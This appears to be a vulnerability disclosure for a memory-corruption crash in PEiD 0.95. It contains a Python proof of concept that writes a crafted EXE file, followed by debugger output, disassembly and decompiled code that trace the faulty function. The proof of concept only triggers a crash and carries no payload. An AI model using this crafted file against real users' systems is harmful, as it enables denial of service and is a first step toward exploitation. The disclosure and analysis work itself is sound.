@@ -1,0 +1,269 @@
+# Title: PEiD v0.95 Memory Corruption
+# About PEiD :  PEiD is an intuitive application that relies on its user-friendly interface to detect packers, cryptors and compilers found in PE executable files. Very popular among malware researchers for detection of packers / cryptors.
+# Date: 22nd June 2013
+# Author: Debasish Mandal ( https://twitter.com/debasishm89 )
+# Blog : http://www.debasish.in/
+# Version: PEiD version 0.95
+# Download Link : http://www.softpedia.com/progChangelog/PEiD-updated-Changelog-4102.html
+# Tested on: Windows XP SP2 / Windows 7
+# Vendor Patch : Unpatched. This software is not under active development. Last stable version released on November 6th, 2008.
+# Threat mitigation : Exploitation of this issue requires the user to explicitly open a specially crafted EXE file. So the PEiD user should refrain from opening files from untrusted third parties or accessing untrusted remote sites.
+
+# POC
+
+# c:\python27
+junk = "\x41"
+header = "MZ"
+header += junk * 58
+header += "\x80"
+header += "\x00" * 3
+header += junk * 64
+header += "PE"
+header += "\x00"*2
+header += junk * 3
+header += "\x00"
+header += junk * 12
+header += "\xe0\x00"
+header += junk * 2
+header += "\x0b\x01"
+header += junk * 16
+header += "\x00" * 2
+header += junk * 338
+header += "\x00" * 2
+header += junk * 5
+header += "\x00" * 3
+header += junk * 2427
+header += "\xa9"
+header += junk * 7
+header += "\x90"
+header += junk * 3	
+header += "\x90"
+header += junk * 40
+f = open('peid_poc.exe','wb')
+f.write(header)
+f.close()
+'''
+Above python code will generate a crafted EXE. This EXE can be used as POC to trigger the Crash of PEiD version 0.95.
+
+(9fc.c2c): Access violation - code c0000005 (!!! second chance !!!)
+eax=00000000 ebx=6fbeca5e ecx=00d4fae0 edx=00000019 esi=00000000 edi=91164141
+eip=0043d4d1 esp=00d4faac ebp=00d4fee8 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000286
+*** WARNING: Unable to verify checksum for C:\Documents and Settings\debasish mandal\Desktop\Tools\PEiD-0.95-20081103\PEiD.exe
+*** ERROR: Module load completed but symbols could not be loaded for C:\Documents and Settings\debasish mandal\Desktop\Tools\PEiD-0.95-20081103\PEiD.exe
+PEiD+0x3d4d1:
+0043d4d1 8a0c07          mov     cl,byte ptr [edi+eax]      ds:0023:91164141=??
+
+PEiD Crashes at With Read AV @ 0043d4d1. EDI Register is pointing to ring0 : edi=91164141.
+
+Stack Trace:
+
+0:001> kb
+ChildEBP RetAddr  Args to Child              
+WARNING: Stack unwind information not available. Following frames may be wrong.
+00d4fee8 78b8c3c0 64123456 0000058f c4830000 PEiD+0x3d4d1
+00d4ff04 0045d1e6 0040867c 00d4ff7c 00000000 0x78b8c3c0
+00d4ff40 00455b97 0040867c 00d4ff7c 00000000 PEiD+0x5d1e6
+00d4ffb4 7c80b50b 0048650c 001520a8 0012f4bc PEiD+0x55b97
+00d4ffe0 7c80b517 00000000 00000000 00000000 kernel32!BaseThreadStart+0x37
+00d4ffe4 00000000 00000000 00000000 00455a50 kernel32!BaseThreadStart+0x43
+
+Stack Dump:
+
+0:001> d esp
+00d4faac  41 41 41 90 7c ff d4 00-40 ff d4 00 77 ca be 6f  AAA.|...@...w..o
+00d4fabc  e0 fa d4 00 37 4c 44 00-41 41 16 91 77 ca be 6f  ....7LD.AA..w..o
+00d4facc  dc fa d4 00 20 01 00 00-18 00 00 00 7c 86 40 00  .... .......|.@.
+00d4fadc  90 41 91 7c e8 fe d4 00-19 00 00 00 08 00 00 00  .A.|............
+00d4faec  1a 00 00 00 1a 00 00 00-1a 00 00 00 05 00 00 00  ................
+00d4fafc  0c 00 00 00 1a 00 00 00-1a 00 00 00 1a 00 00 00  ................
+00d4fb0c  1a 00 00 00 1a 00 00 00-1a 00 00 00 1a 00 00 00  ................
+00d4fb1c  1a 00 00 00 1a 00 00 00-1a 00 00 00 1a 00 00 00  ................
+
+00DFFAAC   90414141   <- ESP
+00DFFAB0   00DFFF7C
+00DFFAB4   00DFFF40
+00DFFAB8   6FBECA77
+00DFFABC   00DFFAE0
+00DFFAC0   00444C37  RETURN to PEiD.00444C37 from PEiD.0043D4A0
+00DFFAC4   91084141
+00DFFAC8   6FBECA77
+00DFFACC   00DFFADC
+00DFFAD0   00000120
+00DFFAD4   00000018
+00DFFAD8   0040867C  PEiD.0040867C
+00DFFADC   7C914190  RETURN to ntdll.7C914190 from ntdll.7C910387
+
+Disassembly of the function where program crashed. Function : PEiD.0043D4A0 (I've named it as "crash_function")
+
+0043D4A0   51               PUSH ECX
+0043D4A1   8B51 04          MOV EDX,DWORD PTR DS:[ECX+4]
+0043D4A4   8B4424 0C        MOV EAX,DWORD PTR SS:[ESP+C]
+0043D4A8   3BC2             CMP EAX,EDX
+0043D4AA   890C24           MOV DWORD PTR SS:[ESP],ECX
+0043D4AD   7D 06            JGE SHORT PEiD.0043D4B5
+0043D4AF   32C0             XOR AL,AL
+0043D4B1   59               POP ECX
+0043D4B2   C2 0C00          RETN 0C
+0043D4B5   53               PUSH EBX
+0043D4B6   55               PUSH EBP
+0043D4B7   8BD8             MOV EBX,EAX
+0043D4B9   56               PUSH ESI
+0043D4BA   2BDA             SUB EBX,EDX
+0043D4BC   33F6             XOR ESI,ESI
+0043D4BE   57               PUSH EDI
+0043D4BF   8B7C24 18        MOV EDI,DWORD PTR SS:[ESP+18]
+0043D4C3   85DB             TEST EBX,EBX
+0043D4C5   7E 34            JLE SHORT PEiD.0043D4FB
+0043D4C7   33C0             XOR EAX,EAX
+0043D4C9   85D2             TEST EDX,EDX
+0043D4CB   7E 42            JLE SHORT PEiD.0043D50F
+0043D4CD   8B29             MOV EBP,DWORD PTR DS:[ECX]
+0043D4CF   03FE             ADD EDI,ESI
+0043D4D1   8A0C07           MOV CL,BYTE PTR DS:[EDI+EAX]   <- Code crashes here
+0043D4D4   3A0C28           CMP CL,BYTE PTR DS:[EAX+EBP]
+0043D4D7   75 07            JNZ SHORT PEiD.0043D4E0
+0043D4D9   40               INC EAX
+0043D4DA   3BC2             CMP EAX,EDX
+
+Setting a BP @ Entry 0x0043D4A0 of this function we can see the value of EDI register is already corrupted before entering into this function. 
+To find out the cross reference which means other function calling above function we used IDA Pro. 
+IDA Pro Shows us that this function is getting called multiple times:
+
+Direction Type Address        Text                  
+--------- ---- -------        ----                  
+Down      p    sub_43DF00+E1  call    crash_function
+Down      p    sub_43F260+1E9 call    crash_function
+Down      p    sub_43F260+230 call    crash_function
+Down      p    sub_43F260+312 call    crash_function
+Down      p    sub_43F260+346 call    crash_function
+Down      p    sub_43F260+382 call    crash_function
+Down      p    sub_43F260+3A9 call    crash_function
+Down      p    vuln_func+162  call    crash_function
+Down      p    sub_446020+1A5 call    crash_function
+Down      p    sub_446020+1C7 call    crash_function
+Down      p    sub_446020+20F call    crash_function
+Down      p    sub_446020+22D call    crash_function
+Down      p    sub_446020+271 call    crash_function
+Down      p    sub_446020+28F call    crash_function
+Down      p    sub_446020+2D6 call    crash_function
+Down      p    sub_446020+2F8 call    crash_function
+Down      p    sub_446020+339 call    crash_function
+Down      p    sub_446020+357 call    crash_function
+
+After Analyzing the code It was found found that below function is actually calling the PEiD.0043D4A0 function which triggers the crash: 
+This is the actual vulnerable function which causes the corruption.
+
+00444AD0   81EC 2C040000    SUB ESP,42C
+00444AD6   A1 D4A54000      MOV EAX,DWORD PTR DS:[40A5D4]
+00444ADB   33C4             XOR EAX,ESP
+00444ADD   898424 28040000  MOV DWORD PTR SS:[ESP+428],EAX
+00444AE4   33C9             XOR ECX,ECX
+00444AE6   56               PUSH ESI
+00444AE7   8BB424 38040000  MOV ESI,DWORD PTR SS:[ESP+438]
+00444AEE   8B46 0C          MOV EAX,DWORD PTR DS:[ESI+C]
+00444AF1   C68424 10040000 >MOV BYTE PTR SS:[ESP+410],89
+00444AF9   C68424 11040000 >MOV BYTE PTR SS:[ESP+411],4A
+00444B01   C68424 12040000 >MOV BYTE PTR SS:[ESP+412],0FC
+00444B09   C68424 13040000 >MOV BYTE PTR SS:[ESP+413],33
+00444B11   C68424 14040000 >MOV BYTE PTR SS:[ESP+414],0C0
+00444B19   C68424 15040000 >MOV BYTE PTR SS:[ESP+415],0C3
+00444B21   C68424 16040000 >MOV BYTE PTR SS:[ESP+416],0B8
+00444B29   C68424 17040000 >MOV BYTE PTR SS:[ESP+417],78
+00444B31   C68424 18040000 >MOV BYTE PTR SS:[ESP+418],56
+00444B39   C68424 19040000 >MOV BYTE PTR SS:[ESP+419],34
+00444B41   C68424 1A040000 >MOV BYTE PTR SS:[ESP+41A],12
+00444B49   C68424 1B040000 >MOV BYTE PTR SS:[ESP+41B],64
+00444B51   C68424 1C040000 >MOV BYTE PTR SS:[ESP+41C],8F
+00444B59   C68424 1D040000 >MOV BYTE PTR SS:[ESP+41D],5
+00444B61   888C24 1E040000  MOV BYTE PTR SS:[ESP+41E],CL
+00444B68   888C24 1F040000  MOV BYTE PTR SS:[ESP+41F],CL
+00444B6F   888C24 20040000  MOV BYTE PTR SS:[ESP+420],CL
+00444B76   888C24 21040000  MOV BYTE PTR SS:[ESP+421],CL
+00444B7D   C68424 22040000 >MOV BYTE PTR SS:[ESP+422],83
+00444B85   C68424 23040000 >MOV BYTE PTR SS:[ESP+423],0C4
+00444B8D   C68424 24040000 >MOV BYTE PTR SS:[ESP+424],4
+00444B95   C68424 25040000 >MOV BYTE PTR SS:[ESP+425],55
+00444B9D   C68424 26040000 >MOV BYTE PTR SS:[ESP+426],53
+00444BA5   C68424 27040000 >MOV BYTE PTR SS:[ESP+427],51
+00444BAD   C68424 28040000 >MOV BYTE PTR SS:[ESP+428],57
+00444BB5   0FB740 06        MOVZX EAX,WORD PTR DS:[EAX+6]
+00444BB9   83F8 02          CMP EAX,2
+00444BBC   73 18            JNB SHORT PEiD.00444BD6
+00444BBE   32C0             XOR AL,AL
+00444BC0   5E               POP ESI
+00444BC1   8B8C24 28040000  MOV ECX,DWORD PTR SS:[ESP+428]
+00444BC8   33CC             XOR ECX,ESP
+00444BCA   E8 A88F0200      CALL PEiD.0046DB77
+00444BCF   81C4 2C040000    ADD ESP,42C
+00444BD5   C3               RETN
+00444BD6   53               PUSH EBX
+00444BD7   57               PUSH EDI
+00444BD8   8B7E 18          MOV EDI,DWORD PTR DS:[ESI+18]
+00444BDB   8D1480           LEA EDX,DWORD PTR DS:[EAX+EAX*4]
+00444BDE   8B7CD7 EC        MOV EDI,DWORD PTR DS:[EDI+EDX*8-14] 
+00444BE2   51               PUSH ECX
+00444BE3   48               DEC EAX
+00444BE4   50               PUSH EAX
+00444BE5   8BCE             MOV ECX,ESI
+00444BE7   E8 748A0100      CALL PEiD.0045D660
+00444BEC   8BD8             MOV EBX,EAX
+00444BEE   8D043B           LEA EAX,DWORD PTR DS:[EBX+EDI]
+00444BF1   3B46 04          CMP EAX,DWORD PTR DS:[ESI+4]
+00444BF4   76 1A            JBE SHORT PEiD.00444C10
+00444BF6   5F               POP EDI
+00444BF7   5B               POP EBX
+00444BF8   32C0             XOR AL,AL
+00444BFA   5E               POP ESI
+00444BFB   8B8C24 28040000  MOV ECX,DWORD PTR SS:[ESP+428]
+00444C02   33CC             XOR ECX,ESP
+00444C04   E8 6E8F0200      CALL PEiD.0046DB77
+00444C09   81C4 2C040000    ADD ESP,42C
+00444C0F   C3               RETN
+00444C10   6A 19            PUSH 19
+00444C12   8D8C24 1C040000  LEA ECX,DWORD PTR SS:[ESP+41C]
+00444C19   51               PUSH ECX
+00444C1A   8D4C24 18        LEA ECX,DWORD PTR SS:[ESP+18]
+00444C1E   E8 1D87FFFF      CALL PEiD.0043D340
+00444C23   8B06             MOV EAX,DWORD PTR DS:[ESI]
+00444C25   8D5424 0C        LEA EDX,DWORD PTR SS:[ESP+C]
+00444C29   52               PUSH EDX
+00444C2A   53               PUSH EBX
+00444C2B   03C7             ADD EAX,EDI
+00444C2D   50               PUSH EAX
+00444C2E   8D4C24 1C        LEA ECX,DWORD PTR SS:[ESP+1C]
+00444C32   E8 6988FFFF      CALL PEiD.0043D4A0                  <- CAll to the crash function
+
+Equivalent C Code:
+
+char vuln_func(int a1, int a2)
+{
+  int v6;
+  v3 = (a2 + 12);
+  v9 = -119;
+  v10 = 74;
+  v11 = -4;
+// Declaration of few more local variables. Ommited
+  v2 = (v3 + 6);
+  if ( v2 >= 2 )
+  {
+    v6 = ((a2 + 24) + 40 * v2 - 20);   // <<---
+    v5 = before_crash1(a2, v2 - 1, 0); 
+    if ((v5 + v6) <= (a2 + 4) )
+    {
+      before_crash2(&v9, 25);
+      result = crash_function((int)&v8, v6 + a2, v5, (int)&v7);	//Vulnerable function calling the crash_function. Inside this peid prog. will crash
+    }
+    else
+    {
+      result = 0;
+    }
+  }
+  else
+  {
+    result = 0;
+  }
+  return result;
+}
+
+'''
